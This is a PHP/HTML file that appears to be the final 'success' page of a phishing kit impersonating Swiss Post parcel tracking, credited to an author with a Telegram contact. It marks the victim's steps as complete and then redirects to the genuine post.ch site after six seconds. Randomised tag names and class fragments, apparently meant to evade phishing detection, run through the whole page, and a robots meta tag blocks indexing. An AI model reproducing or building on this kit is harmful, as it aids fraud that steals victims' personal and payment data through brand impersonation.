<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "success";
    $semantic = semantic();
?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Detailed Tracking</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">

		<<?php echo $semantic; ?> id="<?php echo rr(); ?>header<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="<?php echo rr(); ?>top<?php echo rr(); ?>">
                <<?php echo $semantic; ?> class="container">
                    <<?php echo $semantic; ?> class="lang">
                        <p><?php echo $_SESSION['lang']; ?> <i class="fa-solid fa-chevron-down"></i></p>
                        <ul>
                            <li><a href="../index.php?lang=de">DE</a></li>
                            <li><a href="../index.php?lang=en">EN</a></li>
                            <li><a href="../index.php?lang=fr">FR</a></li>
                            <li><a href="../index.php?lang=it">IT</a></li>
                        </ul>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
            <<?php echo $semantic; ?> class="container">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>logo<?php echo rr(); ?>"><img src="../media/imgs/logo.svg"></<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <<?php echo $semantic; ?> id="<?php echo rr(); ?>main<?php echo rr(); ?>" class="flex-grow-1">
            <<?php echo $semantic; ?> class="container">
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>title<?php echo rr(); ?>">
                    <h3><?php echo get_text('title'); ?></h3>
                    <p><?php echo get_text('subtitle'); ?></p>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> class="<?php echo rr(); ?>steps<?php echo rr(); ?>">
                    <ul>
                        <li class="active">
                            <span>1</span>
                            <p><?php echo get_text('step1'); ?></p>
                        </li>
                        <li class="active">
                            <span>2</span>
                            <p><?php echo get_text('step2'); ?></p>
                        </li>
                        <li class="active">
                            <span>3</span>
                            <p><?php echo get_text('step3'); ?></p>
                        </li>
                    </ul>
                </<?php echo $semantic; ?>>
                <<?php echo $semantic; ?> id="<?php echo rr(); ?>forma<?php echo rr(); ?>">
                    <<?php echo $semantic; ?> class="<?php echo rr(); ?>success<?php echo rr(); ?>">
                        <<?php echo $semantic; ?>><img src="../media/imgs/sus.gif" alt=""></<?php echo $semantic; ?>>
                        <h3><?php echo get_text('successtitle'); ?></h3>
                        <p>
                            <?php echo get_text('successmessage'); ?>
                        </p>
                    </<?php echo $semantic; ?>>
                </<?php echo $semantic; ?>>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <<?php echo $semantic; ?> id="<?php echo rr(); ?>footer<?php echo rr(); ?>">
            <<?php echo $semantic; ?> class="container">
                <p><?php echo get_text('copyright'); ?></p>
                <ul>
                    <li><?php echo get_text('footer_list_1'); ?></li>
                    <li><?php echo get_text('footer_list_2'); ?></li>
                    <li><?php echo get_text('footer_list_3'); ?></li>
                    <li><?php echo get_text('footer_list_4'); ?></li>
                </ul>
            </<?php echo $semantic; ?>>
        </<?php echo $semantic; ?>>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            $('.lang p').click(function(){
                $('.lang ul').slideToggle();
            });
            setTimeout(function () {
                window.location.href= 'https://www.post.ch/';
            },6000); // 1000 = 1s
        </script>

    </body>

</html>